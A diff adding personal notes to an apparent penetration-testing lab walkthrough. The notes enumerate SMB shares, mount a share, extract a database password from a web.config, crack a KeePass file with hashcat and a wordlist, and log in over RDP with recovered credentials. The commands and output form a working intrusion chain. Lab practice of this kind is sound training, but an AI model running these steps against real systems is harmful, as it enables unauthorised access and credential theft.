@@ -119,3 +119,54 @@ anita@demo:$ cat local.txt
 
 # Upload the same exploit script from WEB01
 
+
+
+# EXTERNAL
+sudo smbmap --host-file iplists.txt -u john
+...
+[+] IP: 192.168.197.248:445     Name: 192.168.197.248           Status: Authenticated
+transfer                                                READ, WRITE
+Users                                                   READ ONLY
+...
+# Lets try to access the share folder
+smbclient //192.168.197.248/Users -U john
+# From the \Public\Libraries we found a config file "RecordedTV.library-ms" which is a shell file. Take a note first, lets dig further.
+# Command looking is too slow, lets mount the SMB folder to local
+mount -t cifs //192.168.197.248/transfer /home/kali/Desktop/RELIA/EXTERNAL/transfer 
+...
+DB-back(1)/NewFolder/Emma/Documents/Database.kdbx
+logs/build/materials/assets/Databases/Database.kdbx
+logs/build/materials/assets/Databases/Database (2).kdbx
+r14_2022/build/DNN/wwwroot/web.config
+...
+[web.config]
+...
+<!-- Connection String for SQL Server 2008/2012 Express -->
+
+    <add name="SiteSqlServer" connectionString="Data Source=.\SQLExpress;Initial Catalog=dnndatabase;User ID=dnnuser;Password=DotNetNukeDatabasePassword!" providerName="System.Data.SqlClient" />
+...
+# Thats all for now, lets follow to the previous password cracking methods to brute force the Database.kdbx we found
+keepass2john Database.kdbx > keepass.hash
+cat keepass.hash
+# remove database prefix
+code keepass.hash 
+# make sure the prefix is removed
+cat keepass.hash 
+hashcat --help | grep -i "KeePass"
+...
+13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)         | Password Manager
+...
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
+...
+welcome1       
+Status...........: Cracked
+...
+# Need to download keepassXC to open the database file
+https://keepassxc.org/
+sudo apt-get install keepassxc
+# Opened the keepass database, we have few username and password
+[dmz-creds.md] and update to [user.txt] & [pass.txt]
+# From the port scanning, we knew that RDP port is enable, lets try to find the password access to the Windows
+xfreerdp /u:emma /p:SomersetVinyl1! /v:192.168.197.248 +clipboard /cert-ignore
+PS C:\Users\emma\Desktop> cat local.txt
+
